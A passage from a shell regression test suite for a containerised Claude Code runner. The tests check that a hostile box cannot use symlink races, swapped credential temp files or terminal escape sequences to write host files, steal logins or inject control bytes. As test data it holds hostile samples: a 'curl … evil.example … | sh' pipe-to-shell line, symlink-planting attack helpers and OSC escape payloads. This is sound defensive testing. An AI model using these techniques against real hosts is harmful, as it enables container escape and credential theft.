$(declare -f _wl_cap_then_plant _wl_session_exec_waits _wl_arm_spawn_link)
_wl_arm_spawn_link
# The clipboard watcher only: no opener, so no browser watcher.
_host_clip_cmd() { echo "true"; }
_host_open_cmd() { echo ""; }
exec_claude "$cname" --dangerously-skip-permissions >/dev/null 2>&1
EOF
  _portable_timeout 15 bash "$TEST_TEMP/wl_spawner.sh" || true
  run test -e "$TEST_TEMP/host-victim"
  assert_failure
  run test -f "$rd/logs/watcher.log"
  assert_success
}

@test "regression v1.5.4: cleat shell never appends watcher output through a link in the clip dir" {
  mkdir -p "$TEST_TEMP/project"
  local cname; cname="$(container_name_for "$TEST_TEMP/project")"
  mock_docker_ps "$cname"
  _host_open_cmd() { echo "true"; }
  _WL_CLIP="$CLEAT_RUN_DIR/$cname/clip"
  _WL_VICTIM="$TEST_TEMP/host-victim"
  _WL_HOSTLOG="$CLEAT_RUN_DIR/$cname/logs/watcher.log"
  mkdir -p "$_WL_CLIP"
  _wl_arm_spawn_link
  run cmd_shell "$TEST_TEMP/project"
  assert_success
  run test -e "$_WL_VICTIM"
  assert_failure
  run test -f "$_WL_HOSTLOG"
  assert_success
}

@test "regression v1.5.4: cleat login never appends watcher output through a link in the clip dir" {
  mkdir -p "$TEST_TEMP/project"
  local cname; cname="$(container_name_for "$TEST_TEMP/project")"
  mock_docker_ps "$cname"
  _host_open_cmd() { echo "true"; }
  _WL_CLIP="$CLEAT_RUN_DIR/$cname/clip"
  _WL_VICTIM="$TEST_TEMP/host-victim"
  _WL_HOSTLOG="$CLEAT_RUN_DIR/$cname/logs/watcher.log"
  mkdir -p "$_WL_CLIP"
  _wl_arm_spawn_link
  run cmd_login "$TEST_TEMP/project"
  assert_success
  run test -e "$_WL_VICTIM"
  assert_failure
  run test -f "$_WL_HOSTLOG"
  assert_success
}

@test "regression v1.5.4: a link planted at a session's watcher marker name is never followed" {
  # The session touched .watcher.<its pid> in the clip dir, which the box has
  # read-write. The box could read a live host pid off the markers there and
  # plant links at the names a later session would use, and touch followed the
  # link: the host created, or re-stamped, a file of the box's choosing anywhere
  # the user can write. The marker lives in the host-only clipwatch/ now.
  _host_clip_cmd() { echo "true"; }
  _host_open_cmd() { echo ""; }
  _clipboard_watcher() { :; }
  export CLEAT_NO_CLIPBOARD_IMAGE=1
  local clip="$CLEAT_RUN_DIR/test-wm154/clip" out="$TEST_TEMP/wm154-outside"
  mkdir -p "$clip" "$out"
  # $$ inside `run exec_claude` is this shell's pid, the exact name the session
  # writes.
  ln -s "$out/created" "$clip/.watcher.$$"
  run exec_claude test-wm154 --dangerously-skip-permissions
  assert_success
  run test -e "$out/created"
  assert_failure

  # An existing file is not re-stamped either.
  echo old > "$out/old"
  touch -t 200001010000 "$out/old"
  ln -sfn "$out/old" "$clip/.watcher.$$"
  run exec_claude test-wm154 --dangerously-skip-permissions
  assert_success
  local m; m="$(_path_mtime "$out/old")"
  [ "$m" -lt 1000000000 ] || {
    echo "REGRESSION: the session re-stamped the link's target (mtime $m)"; return 1; }
}

@test "regression v1.5.4: the host never writes .host-ready, even when a link lands after its check" {
  # The watcher dropped a link at .host-ready and then ran touch. The box can
  # rename a fresh link over the name in the gap between the two, and touch
  # follows it. The gap is made deterministic here: every drop of the sentinel
  # is followed at once by a new link. Since v1.5.4 the host does not write the
  # name at all. The box writes it, inside the box.
  local clip_dir="$TEST_TEMP/clip-hr154" out="$TEST_TEMP/hr154-outside"
  mkdir -p "$clip_dir" "$out"
  local target="$out/created"
  ln -s "$target" "$clip_dir/.host-ready"
  _HR154_TARGET="$target"
  _drop_unless_regular() {
    case "$1" in
      */.host-ready) rm -f "$1" 2>/dev/null; ln -s "$_HR154_TARGET" "$1" ;;
      *) if [ -L "$1" ]; then rm -f "$1"; fi ;;
    esac
    return 0
  }
  _clipboard_watcher "$clip_dir" "cat > /dev/null" test-hr154 >/dev/null 2>&1 &
  local pid=$! i
  for i in 1 2 3 4 5 6 7 8 9 10; do
    [ -e "$target" ] && break
    grep -q '/tmp/cleat-clip/.host-ready$' "$DOCKER_CALLS" 2>/dev/null && break
    sleep 0.3
  done
  stop_watcher "$pid" "$clip_dir"
  run test -e "$target"
  assert_failure
}

@test "regression v1.5.4: the clipboard bridge claimed inside the box mount when clipclaim was unusable" {
  # With no host-only clipclaim/ the watcher fell back to claiming inside the
  # clip dir, which the box has read-write. The claim, the cap temp and the
  # read that pipes it to the host clipboard then sat on names the box can list
  # and plant. A regular file at clipclaim makes the mkdir fail, even as root.
  # The bridge is off for the session instead: nothing is claimed, readiness is
  # never announced, and this session's marker and a stale .host-ready go, so
  # the box's shim takes its OSC 52 path.
  use_docker_stub
  local clip="$TEST_TEMP/cf/clip" watch
  mkdir -p "$clip"
  : > "$TEST_TEMP/cf/clipclaim"
  watch="$(_clip_watch_dir "$clip")"
  mkdir -p "$watch"
  # The marker exec_claude writes before it starts the watcher. $$ inside the
  # backgrounded watcher is this shell's pid, so this is the session's name.
  : > "$watch/.watcher.$$"
  : > "$clip/.host-ready"
  # A fresh copy, delivered the way the shim does it. The startup sweep keeps
  # it, so a watcher that claims anything would claim this.
  echo payload > "$clip/.clipboard.t"
  mv "$clip/.clipboard.t" "$clip/clipboard"
  _clipboard_watcher "$clip" "cat > '$TEST_TEMP/cf-copied'" test-cf154 > "$TEST_TEMP/cf-wlog" 2>&1 &
  local pid=$!
  if ! process_exited "$pid"; then
    stop_watcher "$pid" "$clip"
    fail "REGRESSION: the clipboard watcher kept running with no host-only claim dir"
  fi
  wait "$pid" 2>/dev/null || true
  run test -e "$TEST_TEMP/cf-copied"
  assert_failure
  run test -f "$clip/clipboard"
  assert_success
  run test -e "$clip/.host-ready"
  assert_failure
  run test -e "$watch/.watcher.$$"
  assert_failure
  run grep -c '/tmp/cleat-clip/.host-ready$' "$DOCKER_CALLS"
  assert_output "0"
  run cat "$TEST_TEMP/cf-wlog"
  assert_output --partial "clipboard bridge off this session"
}

@test "regression v1.5.4: the browser bridge claimed inside the box mount when clipclaim was unusable" {
  # The same fallback in the browser watcher: the URL was claimed inside the
  # clip dir and the minute ledger was skipped. always mode takes the
  # destination gate out of the way, so a claim made in the mount would open.
  local clip="$TEST_TEMP/bf/clip"
  mkdir -p "$clip"
  : > "$TEST_TEMP/bf/clipclaim"
  cat > "$TEST_TEMP/fake_open" <<OPEN
#!/usr/bin/env bash
echo "\$1" >> "$TEST_TEMP/opened.log"
OPEN
  chmod +x "$TEST_TEMP/fake_open"
  printf '%s' "https://x.example/fallback" > "$clip/.browser-open"
  _browser_watcher "$clip" "$TEST_TEMP/fake_open" "" "always" "0" > "$TEST_TEMP/bf-wlog" 2>&1 &
  local pid=$! exited=0
  process_exited "$pid" && exited=1
  kill "$pid" 2>/dev/null || true
  wait "$pid" 2>/dev/null || true
  [ ! -e "$TEST_TEMP/opened.log" ] || fail "REGRESSION: a URL claimed inside the mount was opened"
  run test -f "$clip/.browser-open"
  assert_success
  run test -e "$clip/.opens"
  assert_failure
  [ "$exited" = 1 ] || fail "REGRESSION: the browser watcher kept running with no host-only claim dir"
  run cat "$TEST_TEMP/bf-wlog"
  assert_output --partial "browser bridge off this session"
}

# A session for the rename regressions below, in a key dir under the isolated
# HOME. No ps_output is written, so Docker answers that the box is not running
# unless a test says otherwise.
_c12_session() {
  C12_SDIR="$HOME/.claude/projects/proj-c12"
  C12_U="11111111-2222-4333-8444-555555555555"
  mkdir -p "$C12_SDIR"
  printf '{"type":"user","message":{"role":"user","content":"hi"},"sessionId":"%s"}\n' "$C12_U" > "$C12_SDIR/$C12_U.jsonl"
}

@test "regression v1.5.4: a rename never writes the sidecar through a linked session folder" {
  # The session dir is the box's own tree, mounted read-write, so the box can
  # leave <uuid> behind as a link to any host directory. mkdir -p, the -d test,
  # mktemp and mv all followed it and custom-title.json landed in that host
  # directory. No race needed: the link outlives the box.
  _daemon_up() { return 0; }
  container_exists() { return 1; }
  _c12_session
  mkdir -p "$TEST_TEMP/hostdir"
  ln -s "$TEST_TEMP/hostdir" "$C12_SDIR/$C12_U"
  run _sessions_do_rename "$C12_SDIR" "$C12_U" main cleat-x pwned
  assert_failure
  run ls -A "$TEST_TEMP/hostdir"
  assert_output ""
  # Every check runs before the first write, so the transcript is untouched too.
  run grep -c custom-title "$C12_SDIR/$C12_U.jsonl"
  assert_output "0"
}

@test "regression v1.5.4: a rename never moves the sidecar into a folder linked at custom-title.json" {
  # mv onto a link to a directory moves the temp INTO that directory, so the
  # box could park .custom-title.json.XXXXXX in any host directory the user can
  # write by planting custom-title.json as a link.
  _daemon_up() { return 0; }
  container_exists() { return 1; }
  _c12_session
  mkdir -p "$C12_SDIR/$C12_U" "$TEST_TEMP/hostdir"
  ln -s "$TEST_TEMP/hostdir" "$C12_SDIR/$C12_U/custom-title.json"
  run _sessions_do_rename "$C12_SDIR" "$C12_U" main cleat-x pwned
  assert_failure
  run ls -A "$TEST_TEMP/hostdir"
  assert_output ""
  run grep -c custom-title "$C12_SDIR/$C12_U.jsonl"
  assert_output "0"
}

@test "regression v1.5.4: a transcript swapped for a link during the title prompt is never appended to" {
  # The containment check ran once, before the prompt, and the writer then
  # opened the transcript by name. A box running while the user typed could
  # swap in a link and stop, and the host appended the record to the link's
  # target, then put its mtime back so nothing looked touched.
  _daemon_up() { return 0; }
  container_exists() { return 1; }
  _is_interactive() { return 0; }
  _c12_session
  printf 'KEEP\n' > "$TEST_TEMP/victim"
  touch -t 202001010101 "$TEST_TEMP/victim"
  local before
  before="$(_path_mtime "$TEST_TEMP/victim")"
  # Runs after the first containment check and before the read.
  _sessions_title_for() {
    mv "$1/$2.jsonl" "$1/$2.jsonl.moved"
    ln -s "$TEST_TEMP/victim" "$1/$2.jsonl"
    echo old
  }
  run _sessions_do_rename "$C12_SDIR" "$C12_U" main cleat-x "" <<< "pwned"
  assert_failure
  assert_output --partial "Could not write the new title"
  run cat "$TEST_TEMP/victim"
  assert_output "KEEP"
  run _path_mtime "$TEST_TEMP/victim"
  assert_output "$before"
}

@test "regression v1.5.4: a rename on a running box is written by the box, never by the host" {
  # While the box runs it can swap any name in its session dir between a host
  # check and the write after it, so the host no longer writes there at all.
  # The box writes its own rename inside its own namespace.
  _daemon_up() { return 0; }
  mock_docker_ps cleat-x
  mock_docker_ps_a cleat-x
  _box_has_live_agent() { return 1; }
  _c12_session
  run _sessions_do_rename "$C12_SDIR" "$C12_U" main cleat-x boxname
  assert_success
  run grep -c boxname "$C12_SDIR/$C12_U.jsonl"
  assert_output "0"
  run test -e "$C12_SDIR/$C12_U"
  assert_failure
  run assert_docker_exec_has "docker exec cleat-x runuser -u coder -- sh -c"
  assert_success
  run assert_docker_exec_has "/home/coder/.claude/projects/-workspace $C12_U boxname"
  assert_success
}

@test "regression v1.5.4: a rename refuses when Docker cannot say whether the box is running" {
  # "Not running" is what hands the write to the host, so a docker ps that
  # fails must not read as it.
  _daemon_up() { return 0; }
  container_exists() { return 1; }
  export DOCKER_EXIT_CODE=1
  _c12_session
  run _sessions_do_rename "$C12_SDIR" "$C12_U" main cleat-x newname
  assert_failure
  assert_output --partial "cannot tell whether"
  run grep -c newname "$C12_SDIR/$C12_U.jsonl"
  assert_output "0"
  run test -e "$C12_SDIR/$C12_U"
  assert_failure
}

# ─────────────────────────────────────────────────────────────────────────────
# v1.5.4: two host writers built a login in a directory a box can write and
# then used it by name. _account_write_file_0600 made its temp beside the
# destination, which for a staged login is the box's own read-write auth dir.
# _seed_macos_credentials made its temp in ~/.claude, which every box mounts
# read-write. mktemp only made the create safe: the redirect, jq and chmod 600
# reopened the name afterwards, so a box that swapped it for a link had the host
# write a login over any host file the user can write and chmod it 600. The
# final `mv -f tmp dest` moved the temp INTO a directory when dest had been
# swapped for a link to one. Both now build the file in a host-only stage dir
# and land it with one rename that names the destination's directory.
# ─────────────────────────────────────────────────────────────────────────────

# The box: whatever the host creates under $1 is subverted at once. A file
# becomes a link to $C13_VICTIM and a directory gets such a link planted inside
# it under the name the writer uses.
_c13_box_mktemp() {
  C13_BOXDIR="$1"
  C13_VICTIM="$TEST_TEMP/precious-host-file"
  printf 'DO-NOT-OVERWRITE\n' > "$C13_VICTIM"
  chmod 644 "$C13_VICTIM"
  mktemp() {
    local p
    p="$(command mktemp "$@")" || return 1
    case "$p" in
      "$C13_BOXDIR"/*)
        : > "$TEST_TEMP/box.acted"
        if [ -d "$p" ]; then
          ln -s "$C13_VICTIM" "$p/.credentials.json"
        else
          rm -f "$p"
          ln -s "$C13_VICTIM" "$p"
        fi ;;
    esac
    printf '%s\n' "$p"
  }
}

_c13_mode() {
  stat -c '%a' "$1" 2>/dev/null || stat -f '%Lp' "$1"
}

@test "regression v1.5.4: an attach never writes a login through a link the box swaps in for the staging temp" {
  _acct_race_setup
  local CN="cleat-race-abcdef12" auth staged leg
  auth="$CLEAT_RUN_DIR/$CN/auth"
  staged="$auth/.credentials.json"
  _box_account_write "$CN" a
  _c13_box_mktemp "$auth"
  for leg in jq nojq; do
    [ "$leg" = nojq ] && _hide_jq
    # Another box refreshed a since this one ran, so the attach stages.
    _acct_race_cred "$CLEAT_ACCOUNTS_DIR/a/.credentials.json" A 2 1789032400000
    _acct_race_cred "$staged" A 1 1789028800000
    run _account_sync_in "$CN"
    assert_success
    run cat "$C13_VICTIM"
    assert_output "DO-NOT-OVERWRITE"
    run _c13_mode "$C13_VICTIM"
    assert_output "644"
    run test -L "$staged"
    assert_failure
    run grep -c '"accessToken":"at-A2"' "$staged"
    assert_output "1"
  done
}

@test "regression v1.5.4: a box that swaps its staged login for a link to a directory cannot move the login out" {
  _acct_race_setup
  local CN="cleat-race-abcdef12" leg
  C13_STAGED="$CLEAT_RUN_DIR/$CN/auth/.credentials.json"
  C13_LOOT="$TEST_TEMP/loot"
  mkdir -p "$C13_LOOT"
  _box_account_write "$CN" a
  # The merge runs inside the writer, after its link and directory checks and
  # before its rename: the window a live box has.
  eval "$(declare -f _account_cred_merge | sed '1s/^_account_cred_merge /_t_orig_merge /')"
  _account_cred_merge() {
    if [ ! -L "$C13_STAGED" ]; then
      rm -f "$C13_STAGED"
      ln -s "$C13_LOOT" "$C13_STAGED"
      : > "$TEST_TEMP/box.swapped"
    fi
    _t_orig_merge "$@"
  }
  for leg in jq nojq; do
    [ "$leg" = nojq ] && _hide_jq
    rm -f "$TEST_TEMP/box.swapped"
    _acct_race_cred "$CLEAT_ACCOUNTS_DIR/a/.credentials.json" A 2 1789032400000
    _acct_race_cred "$C13_STAGED" A 1 1789028800000
    run _account_sync_in "$CN"
    assert_success
    run test -e "$TEST_TEMP/box.swapped"
    assert_success
    run ls -A "$C13_LOOT"
    assert_output ""
    run test -L "$C13_STAGED"
    assert_failure
    run grep -c '"accessToken":"at-A2"' "$C13_STAGED"
    assert_output "1"
  done
}

@test "regression v1.5.4: the macOS seed never writes the Keychain login through a link a box swaps in for its temp" {
  _is_macos() { return 0; }
  # seed_blob and not blob: the CLI's own `local blob` would shadow it.
  local seed_blob='{"claudeAiOauth":{"accessToken":"sk-ant-oat01-KEYCHAIN","refreshToken":"rt","expiresAt":3000000000000}}'
  _macos_keychain_credentials() { printf '%s' "$seed_blob"; }
  local cred="$HOME/.claude/.credentials.json" leg
  mkdir -p "$HOME/.claude"
  _c13_box_mktemp "$HOME/.claude"
  for leg in jq nojq; do
    [ "$leg" = nojq ] && _hide_jq
    rm -f "$cred"
    _SEEDED_CREDS=0
    _seed_macos_credentials
    run cat "$C13_VICTIM"
    assert_output "DO-NOT-OVERWRITE"
    run _c13_mode "$C13_VICTIM"
    assert_output "644"
    run test -L "$cred"
    assert_failure
    run cat "$cred"
    assert_output "$seed_blob"
    assert_equal "$leg $_SEEDED_CREDS" "$leg 1"
  done
}

@test "regression v1.5.4: the macOS seed keeps the Keychain login in place when a box swaps the file for a link to a directory" {
  _is_macos() { return 0; }
  local seed_blob='{"claudeAiOauth":{"accessToken":"KC-FRESH","refreshToken":"rt-kc","expiresAt":3000000000000}}'
  local cred="$HOME/.claude/.credentials.json" leg
  C13_LOOT="$TEST_TEMP/loot"
  mkdir -p "$HOME/.claude" "$C13_LOOT"
  # The Keychain read sits between the expiry check and the rename, a wide
  # window for a box that watches its expired file.
  _macos_keychain_credentials() {
    rm -f "$HOME/.claude/.credentials.json"
    ln -s "$C13_LOOT" "$HOME/.claude/.credentials.json"
    : > "$TEST_TEMP/box.swapped"
    printf '%s' "$seed_blob"
  }
  for leg in jq nojq; do
    [ "$leg" = nojq ] && _hide_jq
    rm -f "$TEST_TEMP/box.swapped" "$cred"
    printf '{"claudeAiOauth":{"accessToken":"BOX-EXPIRED","refreshToken":"rt-box","expiresAt":1000}}' > "$cred"
    _SEEDED_CREDS=0
    _CLEAT_NOW_S=2000000000 _seed_macos_credentials
    run test -e "$TEST_TEMP/box.swapped"
    assert_success
    run ls -A "$C13_LOOT"
    assert_output ""
    run test -L "$cred"
    assert_failure
    run cat "$cred"
    assert_output "$seed_blob"
    assert_equal "$leg $_SEEDED_CREDS" "$leg 1"
  done
}

# ─────────────────────────────────────────────────────────────────────────────
# v1.5.4: untrusted bytes printed raw to the host terminal. The "callback port
# was busy" report printed its URL straight from the bridge log, where the box
# chooses the bytes. The two sibling reports sanitize the same field. This one
# never did, so a forged CALLBACK-UNAVAILABLE line put raw escape bytes, and
# backslash text that echo -e turned into escapes, on the host terminal when
# the session ended.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v1.5.4: a forged callback-port line in the proxy log cannot inject terminal control bytes" {
  local log="$TEST_TEMP/proxy-log" esc bel
  esc="$(printf '\033')"; bel="$(printf '\007')"
  printf '[browser-watcher 12:00:00] %s x url=https://claude.ai/a%s]0;PWN%s\\e[2J\n' \
    "$_BROWSER_NOBIND_MARK" "$esc" "$bel" > "$log"
  run _maybe_report_nobind_opens "$log" 0
  assert_success
  assert_output --partial "https://claude.ai/a]0;PWN"
  assert_output --partial '\e[2J'
  refute_output --partial "${esc}]0;PWN"
  refute_output --partial "${esc}[2J"
}

# v1.5.4: an invalid [resources] value was echoed raw through warn (echo -e).
# The project .cleat is read with no trust gate, so a cloned repo, or a box
# writing /workspace/.cleat, printed its own escape sequences on the next
# create. The global-config branch had the same shape.
@test "regression v1.5.4: an invalid resources value from a project .cleat is echoed without its control bytes" {
  local esc bel
  esc="$(printf '\033')"; bel="$(printf '\007')"
  mkdir -p "$TEST_TEMP/proj" "$(dirname "$CLEAT_GLOBAL_CONFIG")"
  printf '[resources]\nmemory = \\e]0;PWN\\a%s[2Jx\ncpus = %s]0;PWN%s\n' "$esc" "$esc" "$bel" > "$TEST_TEMP/proj/.cleat"
  printf '[resources]\nmemory = g%s]0;GLB%s\ncpus = c%s]0;GLB%s\n' "$esc" "$bel" "$esc" "$bel" > "$CLEAT_GLOBAL_CONFIG"
  _daemon_ncpu() { echo 4; }
  _docker_vm_memory() { echo 0; }
  run resolve_box_memory "$TEST_TEMP/proj" main
  assert_output --partial "Ignoring invalid memory"
  assert_output --partial "in global config"
  assert_output --partial '\e]0;PWN\a'
  assert_output --partial "g]0;GLB"
  refute_output --partial "${esc}]0;PWN"
  refute_output --partial "${esc}[2J"
  refute_output --partial "${esc}]0;GLB"
  run resolve_box_cpus "$TEST_TEMP/proj" main
  assert_output --partial "Ignoring invalid cpus"
  assert_output --partial "in global config"
  assert_output --partial "c]0;GLB"
  refute_output --partial "${esc}]0;PWN"
  refute_output --partial "${esc}]0;GLB"
}

# v1.5.4: cleat config --list, the arrow-key editor and the text editor drew a
# project's [resources] values raw through echo -e, invalid ones included (an
# invalid value loads as the editor's custom pin).
@test "regression v1.5.4: cleat config shows a project resources value without its control bytes" {
  local esc bel hostile ncaps
  esc="$(printf '\033')"; bel="$(printf '\007')"
  hostile="${esc}]0;PWN${bel}"
  ncaps="${#KNOWN_CAPS[@]}"
  mkdir -p "$TEST_TEMP/proj"
  printf '[resources]\nmemory = m%s\ncpus = c%s\n' "$hostile" "$hostile" > "$TEST_TEMP/proj/.cleat"
  _config_vm_gb() { echo 8; }
  cd "$TEST_TEMP/proj"
  run cmd_config --project --list
  assert_success
  assert_output --partial "memory  m]0;PWN"
  assert_output --partial "cpus    c]0;PWN"
  refute_output --partial "$hostile"
  run _config_picker_draw 0 "" "m${hostile}" "c${hostile}"
  assert_output --partial "memory  m]0;PWN"
  assert_output --partial "cpus    c]0;PWN"
  refute_output --partial "$hostile"
  run _config_picker_draw "$ncaps" "" "m${hostile}" "c${hostile}"
  assert_output --partial "‹ m]0;PWN ›"
  refute_output --partial "$hostile"
  run _config_picker_draw "$(( ncaps + 1 ))" "" "m${hostile}" "c${hostile}"
  assert_output --partial "‹ c]0;PWN ›"
  refute_output --partial "$hostile"
  _box_scope=""
  run _config_picker_text "$TEST_TEMP/proj/.cleat" project "$TEST_TEMP/proj" <<< "q"
  assert_output --partial "memory=m]0;PWN"
  assert_output --partial "cpus=c]0;PWN"
  refute_output --partial "$hostile"
}

# v1.5.4: [fork] exclude values were echoed raw in three of the fork-prune
# warnings. The value comes from the project .cleat, which the repo or any
# sibling box can write. (The root-naming warning only ever prints ".", "./" or
# an empty value, so it needed nothing.)
@test "regression v1.5.4: a fork exclude from a project .cleat is echoed without its control bytes" {
  local esc bel hostile real_rm
  esc="$(printf '\033')"; bel="$(printf '\007')"
  hostile="${esc}]0;PWN${bel}"
  mkdir -p "$TEST_TEMP/project" "$TEST_TEMP/elsewhere" "$TEST_TEMP/rmfail"
  ln -s "$TEST_TEMP/elsewhere" "$TEST_TEMP/project/out"
  printf '[fork]\nexclude = /abs%s\nexclude = out/x%s\nexclude = keep%s\n' "$hostile" "$hostile" "$hostile" > "$TEST_TEMP/project/.cleat"
  run _fork_copy_tree "$TEST_TEMP/project" "$CLEAT_FORKS_DIR/testbox"
  assert_success
  # Only the prune of the third exclude fails, so its warning is reached on any
  # host and as root, without relying on permissions.
  real_rm="$(command -v rm)"
  cat > "$TEST_TEMP/rmfail/rm" <<EOF
#!/bin/sh
case "\$*" in *PWN*) exit 1 ;; esac
exec "$real_rm" "\$@"
EOF
  chmod +x "$TEST_TEMP/rmfail/rm"
  PATH="$TEST_TEMP/rmfail:$PATH" run _fork_prune_excludes "$CLEAT_FORKS_DIR/testbox" "$TEST_TEMP/project"
  assert_output --partial "Ignoring unsafe [fork] exclude: /abs]0;PWN"
  assert_output --partial "resolves outside the fork: out/x]0;PWN"
  assert_output --partial "Could not prune [fork] exclude: keep]0;PWN"
  refute_output --partial "$hostile"
}

# v1.5.4: _sessions_safe_str kept every byte from 0x80 up so UTF-8 titles
# survive, which also kept U+0080..U+009F spelled in UTF-8: C2 9B is CSI and
# C2 9D is OSC to xterm and VTE. Session titles and account fields reach it
# from files the box writes. Each pair now renders as '?', in both render
# sanitizers, and a removal can never assemble a fresh pair. Outside a UTF-8
# locale _sanitize_repo_str still strips raw C1 bytes, for 8-bit terminals.
@test "regression v1.5.4: a C1 control spelled in UTF-8 never survives a render sanitizer" {
  local in want nested loc
  in="$(printf 'T\302\2332J\302\2350;x\302\234B caf\303\251 \302\251')"
  want="$(printf 'T?2J?0;x?B caf\303\251 \302\251')"
  nested="$(printf 'a\302\302\233\233z')"
  LC_ALL=""; LC_CTYPE=""
  # Both spellings bash can be in: wide characters where the locale exists,
  # bytes where it does not. The assertions are the same in both.
  for loc in C.UTF-8 en_US.UTF-8; do
    LANG="$loc"
    run _sessions_safe_str "$in"
    assert_output "$want"
    run _sessions_safe_str "$nested"
    assert_output "$(printf 'a\302?\233z')"
    run _sanitize_repo_str "$in"
    assert_output "$want"
    run _sanitize_repo_str "$nested"
    assert_output "$(printf 'a\302?\233z')"
  done
  LANG="C"
  run _sessions_safe_str "$in"
  assert_output "$want"
  run _sanitize_repo_str "$(printf 'a\23331mb')"
  assert_output "a31mb"
}

# v1.5.4: _sanitize_repo_str stripped 0x80-0x9f, which are UTF-8 continuation
# bytes, then ran an unpinned sed. An em dash became a lone 0xe2, BSD sed under
# a UTF-8 LC_CTYPE exits non-zero on that, and the [setup] consent preview on a
# Mac showed the line as a blank row while the command still ran. GNU sed
# printed the mangled bytes, so on Linux the line lost its em dash instead.
@test "regression v1.5.4: a setup preview line with a typographic character is shown intact" {
  local payload
  mkdir -p "$TEST_TEMP/proj"
  LC_ALL=""; LC_CTYPE=""; LANG="en_US.UTF-8"
  payload="$(printf 'curl -fsSL https://evil.example/p.sh | sh  # see README \342\200\224\ncurl -fsSL https://evil.example/q.sh | sh  # \377\n')"
  run _setup_trust_prompt "$TEST_TEMP/proj" "$payload" 2 <<< "n"
  assert_output --partial "$(printf 'curl -fsSL https://evil.example/p.sh | sh  # see README \342\200\224')"
  assert_output --partial "curl -fsSL https://evil.example/q.sh | sh"
}

# v1.5.4: the same unpinned sed, in the post-session browser reports, sits in a
# plain assignment. Under the binary's set -euo pipefail a failing sed ended
# exec_claude, cmd_shell and cmd_login right after the report heading, skipping
# everything after it. The sed stand-in refuses any non-ASCII input, a superset
# of what BSD sed refuses, so any sed on this path shows up on Linux too.
@test "regression v1.5.4: a post-session browser report survives a non-ASCII URL under strict mode" {
  local log="$TEST_TEMP/proxy-log" real_sed
  mkdir -p "$TEST_TEMP/bsdsed"
  real_sed="$(command -v sed)"
  cat > "$TEST_TEMP/bsdsed/sed" <<EOF
#!/bin/sh
for a in "\$@"; do [ -f "\$a" ] && exec "$real_sed" "\$@"; done
t="\$(mktemp)"; cat > "\$t"
if [ -n "\$(LC_ALL=C tr -d '\000-\177' < "\$t")" ]; then
  rm -f "\$t"; echo "sed: RE error: illegal byte sequence" >&2; exit 1
fi
"$real_sed" "\$@" < "\$t"; rc=\$?; rm -f "\$t"; exit \$rc
EOF
  chmod +x "$TEST_TEMP/bsdsed/sed"
  printf '[browser-watcher 12:00:00] %s origin=evil.example url=https://evil.example/\342\200\224x\n' "$_BROWSER_BLOCKED_MARK" > "$log"
  sed 's/^set -euo pipefail$/:/' "$CLI" > "$TEST_TEMP/cli_stripped"
  run env LC_ALL= LC_CTYPE= LANG=en_US.UTF-8 bash -c \
    'source "$1"; PATH="$3:$PATH"; set -euo pipefail; _maybe_report_blocked_opens "$2" 0; echo REPORT-DONE' \
    _ "$TEST_TEMP/cli_stripped" "$log" "$TEST_TEMP/bsdsed"
  assert_success
  assert_output --partial "$(printf 'https://evil.example/\342\200\224x')"
  assert_output --partial "REPORT-DONE"
}

# v1.5.4: session teardown swept .clipboard.* and .claim.<pid>.* in the clip dir
# with stderr on the terminal. Every name past the prefix is the box's. BSD rm
# reports an operand it will not remove (a directory) raw, so on a Mac a
# box-made directory named with an escape sequence printed it at teardown. GNU
# rm quotes the name, so the stand-in rm below reproduces the BSD report.
@test "regression v1.5.4: session teardown never prints a box-chosen clip-dir name raw" {
  local clip="$CLEAT_RUN_DIR/test-td154/clip" real_rm esc bel
  esc="$(printf '\033')"; bel="$(printf '\007')"
  _host_clip_cmd() { echo "true"; }
  _host_open_cmd() { echo ""; }
  _clipboard_watcher() { :; }
  export CLEAT_NO_CLIPBOARD_IMAGE=1
  mkdir -p "$TEST_TEMP/shim"
  real_rm="$(command -v rm)"
  cat > "$TEST_TEMP/shim/rm" <<EOF
#!/bin/sh
rec=0
for a in "\$@"; do case "\$a" in --) break ;; -*[rR]*) rec=1 ;; esac; done
if [ "\$rec" = 0 ]; then
  for a in "\$@"; do case "\$a" in -*) ;; *) [ -d "\$a" ] && printf 'rm: %s: is a directory\n' "\$a" >&2 ;; esac; done
fi
exec "$real_rm" "\$@"
EOF
  chmod +x "$TEST_TEMP/shim/rm"
  # \$\$ inside `run exec_claude` is this shell's pid, the exact claim name the
  # teardown sweeps.
  mkdir -p "$clip/.clipboard.cb${esc}]0;PWN${bel}" "$clip/.claim.$$.cl${esc}]0;PWN${bel}"
  PATH="$TEST_TEMP/shim:$PATH" run exec_claude test-td154 --dangerously-skip-permissions
  assert_success
  refute_output --partial "${esc}]0;PWN"
}

# v1.5.4: the fork copy and delete ran cp and rm -rf with stderr on the
# terminal, over trees a box writes. BSD cp and rm report a failing path raw,
# so a chmod-000 file named with an escape sequence printed it on a Mac during
# fork start, refresh or rm. The tool's first three lines are now shown through
# the row sanitizer, so the name of the file that failed is still there.
# Write a BSD-style rm into $1 that fails with a raw name on any rm -rf of an
# existing path containing one of the patterns after it, and runs the real rm
# for everything else.
_c14_bsd_rm() {
  local dir="$1" real_rm pats="" p
  shift
  for p in "$@"; do pats="${pats:+$pats|}*\"$p\"*"; done
  real_rm="$(command -v rm)"
  mkdir -p "$dir"
  cat > "$dir/rm" <<EOF
#!/bin/sh
case " \$* " in *" -rf "*)
  for a in "\$@"; do
    [ -e "\$a" ] || continue
    case "\$a" in $pats) printf 'rm: nope/gone-NAME\033]0;PWN\007: Permission denied\n' >&2; exit 1 ;; esac
  done ;;
esac
exec "$real_rm" "\$@"
EOF
  chmod +x "$dir/rm"
}

@test "regression v1.5.4: a failing fork copy or delete never prints a box-chosen file name raw" {
  local esc stale
  esc="$(printf '\033')"
  # The staging dir's name. \$\$ inside `run` is this shell's pid.
  stale="$CLEAT_FORKS_DIR/.tmp.$$"
  mkdir -p "$TEST_TEMP/project" "$TEST_TEMP/bsdcp" "$TEST_TEMP/failmv"
  echo hi > "$TEST_TEMP/project/f"
  cat > "$TEST_TEMP/bsdcp/cp" <<'EOF'
#!/bin/sh
case "$1" in --version|--help) exit 1 ;; esac
for i in 1 2 3 4 5; do printf 'cp: nope/leak%d-NAME\033]0;PWN\007: Permission denied\n' "$i" >&2; done
exit 1
EOF
  printf '#!/bin/sh\nexit 1\n' > "$TEST_TEMP/failmv/mv"
  chmod +x "$TEST_TEMP/bsdcp/cp" "$TEST_TEMP/failmv/mv"
  _c14_bsd_rm "$TEST_TEMP/rm-tmp" "/.tmp."
